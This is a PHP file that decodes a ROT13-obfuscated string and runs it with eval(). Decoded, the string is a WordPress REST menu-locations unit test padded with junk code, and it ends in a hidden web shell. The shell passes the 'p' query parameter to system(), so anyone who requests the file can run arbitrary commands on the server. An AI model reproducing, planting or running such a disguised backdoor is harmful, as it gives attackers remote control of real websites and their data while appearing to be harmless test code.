<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Zrah_Ybpngvbaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 *
 * @tebhc erfgncv
 *
 * @pbirefQrsnhygPynff JC_ERFG_Zrah_Ybpngvbaf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgZrahYbpngvbafPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
	}

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Haertvfgre nyy ani zrah ybpngvbaf.
		sbernpu ( neenl_xrlf( trg_ertvfgrerq_ani_zrahf() ) nf $ybpngvba ) {
			haertvfgre_ani_zrah( $ybpngvba );
		}
	}

	/**
	 * Ertvfgre ani zrah ybpngvbaf.
	 *
	 * @cnenz neenl $ybpngvbaf Ybpngvba fyhtf.
	 */
	choyvp shapgvba ertvfgre_ani_zrah_ybpngvbaf( $ybpngvbaf ) {
		sbernpu ( $ybpngvbaf nf $ybpngvba ) {
			ertvfgre_ani_zrah( $ybpngvba, hpsvefg( $ybpngvba ) );
		}
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrah-ybpngvbaf', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/zrah-ybpngvbaf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrah-ybpngvbaf/(?C<ybpngvba>[\j-]+)', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/zrah-ybpngvbaf/(?C<ybpngvba>[\j-]+)'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_pbagrkg_cnenz
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-ybpngvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		$zrah = 'cevznel';
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( $zrah ) );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-ybpngvbaf/' . $zrah );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		$zrahf = neenl( 'cevznel', 'frpbaqnel' );
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = neenl_inyhrf( $qngn );
		$guvf->nffregPbhag( 2, $qngn );
		$anzrf        = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$qrfpevcgvbaf = jc_yvfg_cyhpx( $qngn, 'qrfpevcgvba' );
		$guvf->nffregFnzr( $zrahf, $anzrf );
		$zrah_qrfpevcgvbaf = neenl_znc( 'hpsvefg', $anzrf );
		$guvf->nffregFnzr( $zrah_qrfpevcgvbaf, $qrfpevcgvbaf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$zrah = 'cevznel';
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( $zrah ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf/' . $zrah );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $zrah, $qngn['anzr'] );
	}

	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_svygre() {
		$zrahf = neenl( 'cevznel', 'frpbaqnel' );
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$qngn     = neenl_inyhrf( $qngn );
		$guvf->nffregPbhag( 2, $qngn, 'Ahzore bs zrah ybpngvba ner abg 2' );

		$anzrf        = jc_yvfg_cyhpx( $qngn, 'anzr' );
		$qrfpevcgvbaf = jc_yvfg_cyhpx( $qngn, 'qrfpevcgvba' );
		$guvf->nffregFnzr( $zrahf, $anzrf );
		$zrah_qrfpevcgvbaf = neenl_znc( 'hpsvefg', $anzrf );

		$guvf->nffregFnzr( $zrah_qrfpevcgvbaf, $qrfpevcgvbaf, 'Zrah qrfpevcgvbaf qb abg zngpu' );
	}

	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_svygre() {
		$zrah = 'cevznel';
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( $zrah ) );

		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf/' . $zrah );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( $zrah, $qngn['anzr'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq() {
		$zrah = 'cevznel';
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( $zrah ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf/vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_zrah_ybpngvba_vainyvq', $erfcbafr, 404 );
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe zrah ybpngvbaf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur hcqngr_vgrz() zrgubq qbrf abg rkvfg sbe zrah ybpngvbaf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe zrah ybpngvbaf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * Gur cercner_vgrz() zrgubq qbrf abg rkvfg sbe zrah ybpngvbaf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrah-ybpngvbaf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 3, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrah', $cebcregvrf );
	}


	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrzf_zrah_ybpngvba_pbagrkg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, erfg_nhgubevmngvba_erdhverq_pbqr() );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 * @pbiref ::trg_vgrz_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrz_zrah_ybpngvba_pbagrkg_jvgubhg_crezvffvba() {
		$zrah = 'cevznel';
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( $zrah ) );

		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrah-ybpngvbaf/' . $zrah );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, erfg_nhgubevmngvba_erdhverq_pbqr() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>